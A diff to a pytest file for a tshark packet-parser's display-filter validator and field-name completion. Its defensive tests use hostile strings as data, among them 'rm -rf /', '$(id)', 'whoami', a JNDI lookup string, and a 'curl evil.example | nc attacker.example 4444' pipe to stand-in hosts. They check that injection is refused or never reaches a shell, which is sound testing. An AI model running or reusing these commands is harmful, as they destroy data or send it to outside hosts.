@@ -57,24 +57,53 @@ def test_validate_display_filter_accepts_benign_filters(benign):
     packet_parser._validate_display_filter(benign)  # must not raise
 
 
-@pytest.mark.parametrize("forbidden_char", list(";$`\\"))
-def test_validate_display_filter_rejects_each_forbidden_character(forbidden_char):
+# `;`, `$`, backtick and backslash were refused here until 2.1: a shell rule on
+# something no shell reads (the argv test below is what holds that true). It
+# cost the regular-expression half of the language, which needs the backslash
+# and the `$` anchor. These are the filters that rule turned away.
+@pytest.mark.parametrize(
+    "regex_or_text",
+    [
+        r'dns.qry.name matches "\\.(com|net)$"',
+        r'dns.qry.name matches r"\.(com|net)$"',
+        r'http.user_agent ~ r"^curl/\d+"',
+        'http.cookie contains "a=1; b=2"',
+        'http.request.uri contains "`"',
+        'frame contains "\\x00\\x01"',
+        "$mymacro(1)",
+    ],
+)
+def test_validate_display_filter_accepts_what_the_shell_rule_refused(regex_or_text):
+    packet_parser._validate_display_filter(regex_or_text)  # must not raise
+
+
+@pytest.mark.parametrize("control", ["\n", "\r", "\t", "\x00", "\x1b", "\x7f"])
+def test_validate_display_filter_rejects_control_characters(control):
+    """What argv cannot carry (NUL) or a one-line filter never needs."""
     with pytest.raises(packet_parser.DisplayFilterError):
-        packet_parser._validate_display_filter(f"tcp.port == 80{forbidden_char}whoami")
+        packet_parser._validate_display_filter(f"tcp.port == 80{control}tcp")
+
+
+# tshark has no selected packet, so `${ip.src}` compiles and matches nothing --
+# silently. The viewer fills references in; one that arrives unfilled is
+# refused, because an empty list must only ever mean "nothing matched".
+@pytest.mark.parametrize("unfilled", ["ip.src == ${ip.dst}", "tcp.port == ${ tcp.srcport }", "${frame.number}"])
+def test_an_unfilled_field_reference_is_refused_with_the_reason(unfilled):
+    with pytest.raises(packet_parser.DisplayFilterError) as exc:
+        packet_parser._validate_display_filter(unfilled)
+    assert "selected packet" in str(exc.value)
 
 
 @pytest.mark.parametrize(
-    "hostile",
+    "not_a_reference",
     [
-        "tcp.port == 80; rm -rf /",
-        "tcp.port == 80`whoami`",
-        "tcp.port == 80$(whoami)",
-        "tcp.port == 80\\x00",
+        'http.request.uri contains "${jndi:ldap://x}"',   # text being hunted for
+        'http.request.uri contains "${x}"',               # the same, inside quotes
+        "${mymacro:1;2}",                                 # a macro call: tshark's to answer
     ],
 )
-def test_validate_display_filter_rejects_hostile_filters(hostile):
-    with pytest.raises(packet_parser.DisplayFilterError):
-        packet_parser._validate_display_filter(hostile)
+def test_text_that_only_looks_like_a_field_reference_is_left_alone(not_a_reference):
+    packet_parser._validate_display_filter(not_a_reference)
 
 
 def test_validate_display_filter_rejects_an_overlong_filter():
@@ -90,7 +119,7 @@ def test_validate_display_filter_rejects_an_overlong_filter():
 
 
 async def test_a_display_filter_reaches_the_tool_as_one_argument_and_no_shell():
-    hostile = "tcp.port == 80 && curl evil.example | nc attacker.example 4444"
+    hostile = "tcp.port == 80 && curl evil.example | nc attacker.example 4444; $(id) `id` \\"
     probe = "import sys, json; print(json.dumps(sys.argv[1:]))"
     stdout, _, rc = await packet_parser._run_tool(
         [sys.executable, "-c", probe, "-Y", hostile], BytesSource(b"")
@@ -195,7 +224,7 @@ class BoomSource(PcapSource):
 async def test_get_packet_list_rejects_hostile_filter_before_running_any_tool():
     with pytest.raises(ValueError):
         await packet_parser.get_packet_list(
-            BoomSource(), display_filter="tcp.port == 80; rm -rf /"
+            BoomSource(), display_filter="tcp.port == 80\nrm -rf /"
         )
 
 
@@ -256,7 +285,7 @@ async def test_get_packet_list_parses_a_real_capture():
 async def test_get_diagram_packets_rejects_hostile_filter_before_running_any_tool():
     with pytest.raises(ValueError):
         await packet_parser.get_diagram_packets(
-            BoomSource(), 10, display_filter="tcp.port == 80; rm -rf /"
+            BoomSource(), 10, display_filter="tcp.port == 80\nrm -rf /"
         )
 
 
@@ -293,6 +322,80 @@ async def test_get_packet_list_respects_offset_and_limit():
     data = _build_minimal_pcap(num_packets=5)
     packets = await packet_parser.get_packet_list(BytesSource(data), offset=2, limit=2)
     assert [p.number for p in packets] == [3, 4]
+
+
+@needs_tshark
+async def test_the_page_says_how_many_matched_not_how_many_it_holds():
+    """A full page looks exactly like a filter that matched a page's worth."""
+    data = _build_minimal_pcap(num_packets=7)
+    first, matched = await packet_parser.get_packet_page(BytesSource(data), limit=3)
+    assert [p.number for p in first] == [1, 2, 3] and matched == 7
+    rest, matched = await packet_parser.get_packet_page(BytesSource(data), offset=3, limit=3)
+    assert [p.number for p in rest] == [4, 5, 6] and matched == 7
+    none, matched = await packet_parser.get_packet_page(BytesSource(data), display_filter="tcp")
+    assert none == [] and matched == 0
+
+
+@needs_tshark
+async def test_a_regular_expression_filter_runs():
+    """The whole point of letting the backslash and the anchor through."""
+    data = _build_minimal_pcap(num_packets=2)
+    packets = await packet_parser.get_packet_list(
+        BytesSource(data), display_filter=r'string(udp.dstport) matches r"^5\d$"'
+    )
+    assert [p.number for p in packets] == [1, 2]
+
+
+# --- help for the filter box -------------------------------------------------
+
+
+@needs_tshark
+async def test_the_filter_check_passes_what_tshark_compiles():
+    await packet_parser.check_display_filter("tcp.port == 443 && !(arp)")
+    await packet_parser.check_display_filter("")
+
+
+@needs_tshark
+@pytest.mark.parametrize("bad, says", [("tcp.porrt == 80", "tcp.porrt"), ("tcp.port ==", "end of filter")])
+async def test_the_filter_check_reports_tsharks_own_complaint(bad, says):
+    with pytest.raises(packet_parser.DisplayFilterError) as exc:
+        await packet_parser.check_display_filter(bad)
+    assert says in str(exc.value)
+
+
+async def test_the_filter_check_refuses_before_running_any_tool(monkeypatch):
+    async def boom(*_a, **_k):
+        raise AssertionError("tshark should never be invoked for a filter the validator refuses")
+    monkeypatch.setattr(packet_parser, "_run_tool", boom)
+    with pytest.raises(packet_parser.DisplayFilterError):
+        await packet_parser.check_display_filter("tcp\nudp")
+
+
+@needs_tshark
+async def test_field_names_come_from_tsharks_registry_shortest_first():
+    packet_parser._FIELD_COMPLETIONS.clear()
+    found = await packet_parser.complete_field_names("tcp.analysis.byt")
+    assert [f["name"] for f in found] == ["tcp.analysis.bytes_in_flight"]
+    assert found[0]["label"]
+    flags = [f["name"] for f in await packet_parser.complete_field_names("tcp.flags")]
+    assert flags[0] == "tcp.flags" and "tcp.flags.syn" in flags
+    assert len(flags) <= packet_parser.FIELD_COMPLETION_LIMIT
+
+
+@needs_tshark
+async def test_a_prefix_typed_in_capitals_still_finds_the_lower_case_name():
+    packet_parser._FIELD_COMPLETIONS.clear()
+    assert "tcp.flags" in [f["name"] for f in await packet_parser.complete_field_names("TCP.fl")]
+    assert await packet_parser.complete_field_names("zzqqx") == []
+
+
+@pytest.mark.parametrize("prefix", ["-G", "fields,x", "tcp port", "", ".tcp", "a" * 65, "tcp;id"])
+async def test_a_prefix_that_is_not_the_start_of_a_field_name_never_reaches_argv(prefix, monkeypatch):
+    async def boom(*_a, **_k):
+        raise AssertionError("no process should be spawned for this prefix")
+    monkeypatch.setattr(packet_parser.asyncio, "create_subprocess_exec", boom)
+    with pytest.raises(ValueError):
+        await packet_parser.complete_field_names(prefix)
 
 
 @needs_tshark
@@ -958,7 +1061,7 @@ async def test_protocol_hierarchy_applies_a_display_filter():
 
 async def test_protocol_hierarchy_rejects_hostile_filter_before_running_any_tool():
     with pytest.raises(ValueError):
-        await packet_parser.get_protocol_hierarchy(BoomSource(), display_filter="tcp; rm -rf /")
+        await packet_parser.get_protocol_hierarchy(BoomSource(), display_filter="tcp\nrm -rf /")
 
 
 @needs_tshark
@@ -1355,3 +1458,26 @@ async def test_conversations_count_an_unchanged_repeat_once(name):
     )
     wan_frames = sum(1 for f in scenario.frames if f[4:8] == b"\x00\x00\x00\x03")
     assert sum(c.packets_a_to_b + c.packets_b_to_a for c in only_wan) == wan_frames
+
+
+@needs_tshark
+async def test_field_names_are_found_on_a_tshark_that_does_not_search_by_prefix(monkeypatch):
+    """tshark 4.2 prints nothing for `-G fields,<prefix>`; the full registry
+    still has the names, and gives the same answer."""
+    packet_parser._FIELD_COMPLETIONS.clear()
+    with_search = await packet_parser.complete_field_names("tcp.analysis.byt")
+    kerberos = await packet_parser.complete_field_names("kerbero")
+
+    real_dump = packet_parser._registry_dump
+
+    async def no_prefix_search(report):
+        return [] if report.startswith("fields,") else await real_dump(report)
+
+    monkeypatch.setattr(packet_parser, "_registry_dump", no_prefix_search)
+    monkeypatch.setattr(packet_parser, "_PREFIX_SEARCH_MISSING", False)
+    packet_parser._FIELD_COMPLETIONS.clear()
+    assert await packet_parser.complete_field_names("tcp.analysis.byt") == with_search
+    assert packet_parser._PREFIX_SEARCH_MISSING is True
+    assert await packet_parser.complete_field_names("kerbero") == kerberos
+    assert await packet_parser.complete_field_names("zzznotafield") == []
+    packet_parser._FIELD_COMPLETIONS.clear()
